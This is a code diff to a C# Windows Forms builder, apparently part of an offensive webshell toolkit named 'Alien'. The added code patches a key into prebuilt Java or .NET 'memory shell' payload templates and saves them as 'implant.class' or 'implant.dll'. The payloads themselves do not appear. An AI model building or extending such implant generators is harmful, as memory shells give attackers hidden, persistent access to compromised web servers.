@@ -78,6 +78,57 @@ namespace Alien
             }
         }
 
+        void fnBuildMemoryShell(string szType, string szPayload, string szKey)
+        {
+            bool fnbMatchBytes(byte[] abSource, int nIdxStart, byte[] abPattern)
+            {
+                for (int i = 0; i < abPattern.Length; i++)
+                {
+                    if (abSource[nIdxStart + i] != abPattern[i])
+                        return false;
+                }
+
+                return true;
+            }
+
+            string szFilePath = Path.Combine(Application.StartupPath, "Builder", "MemoryShell", szType, szPayload + (szType == "Java" ? ".class" : ".dll"));
+            if (szKey.Length != 16)
+                throw new ArgumentException("Key has to be a 16 chars string.");
+
+            byte[] abBytes = File.ReadAllBytes(szFilePath);
+            byte[] abOldBytes = Encoding.ASCII.GetBytes("[KEY]".PadRight(16, ' '));
+            byte[] abNewBytes = Encoding.ASCII.GetBytes(szKey);
+
+            bool bPatched = false;
+
+            for (int i = 0; i <= abBytes.Length - abOldBytes.Length; i++)
+            {
+                if (fnbMatchBytes(abBytes, i, abOldBytes))
+                {
+                    Buffer.BlockCopy(abNewBytes, 0, abBytes, i, abNewBytes.Length);
+                    bPatched = true;
+
+                    break;
+                }
+            }
+
+            if (bPatched)
+            {
+                SaveFileDialog sfd = new SaveFileDialog();
+                sfd.Filter = szType == "Java" ? "Java Class File (*.class)|*.class" : ".NET DLL File (*.dll)|*.dll";
+                sfd.FileName = "implant." + (szType == "Java" ? "class" : "dll");
+
+                if (sfd.ShowDialog() == DialogResult.OK)
+                {
+                    File.WriteAllBytes(sfd.FileName, abBytes);
+                }
+            }
+            else
+            {
+                throw new Exception("Failed to patch the binary: " + szFilePath);
+            }
+        }
+
         void fnSetup()
         {
             textEditorControl1.Text = string.Empty;
@@ -122,6 +173,25 @@ namespace Alien
             comboBox3.SelectedIndex = 0;
 
             textBox4.Text = "iss4cf0ng";
+
+            // MemoryShell
+
+            comboBox4.DropDownStyle = ComboBoxStyle.DropDownList;
+            comboBox5.DropDownStyle = ComboBoxStyle.DropDownList;
+
+            string szMemShellDir = Path.Combine(Application.StartupPath, "Builder", "MemoryShell");
+            if (Directory.Exists(szMemShellDir))
+            {
+                foreach (string szDir in Directory.GetDirectories(szMemShellDir))
+                    comboBox4.Items.Add(Path.GetFileName(szDir));
+
+                if (comboBox4.Items.Count > 0)
+                    comboBox4.SelectedIndex = 0;
+            }
+            else
+            {
+                MessageBox.Show("Cannot find directory: " + szMemShellDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
 
         private void frmBuilder_Load(object sender, EventArgs e)
@@ -273,6 +343,54 @@ namespace Alien
         private void checkBox1_CheckedChanged(object sender, EventArgs e)
         {
             fnUpdateNbPayload();
+        }
+
+        private void textBox5_TextChanged(object sender, EventArgs e)
+        {
+            textBox6.Text = clsCrypto.fnGetMD5Last16(textBox5.Text);
+        }
+
+        private void comboBox4_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            comboBox5.Items.Clear();
+
+            string szMemShellDir = Path.Combine(Application.StartupPath, "Builder", "MemoryShell");
+            if (!Directory.Exists(szMemShellDir))
+            {
+                MessageBox.Show("Cannot find directory: " + szMemShellDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            string szPayloadDir = Path.Combine(szMemShellDir, comboBox4.Text);
+            if (!Directory.Exists(szPayloadDir))
+            {
+                MessageBox.Show("Cannot find directory: " + szMemShellDir, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return;
+            }
+
+            foreach (string szPayloadPath in Directory.GetFiles(szPayloadDir))
+            {
+                if (!(szPayloadPath.Contains(".class") || szPayloadPath.Contains(".dll")))
+                    continue;
+
+                string szFileName = Path.GetFileNameWithoutExtension(szPayloadPath);
+                comboBox5.Items.Add(szFileName);
+            }
+
+            if (comboBox5.Items.Count > 0)
+                comboBox5.SelectedIndex = 0;
+        }
+
+        private void button8_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                fnBuildMemoryShell(comboBox4.Text, comboBox5.Text, textBox6.Text);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, ex.GetType().Name, MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
         }
     }
 }
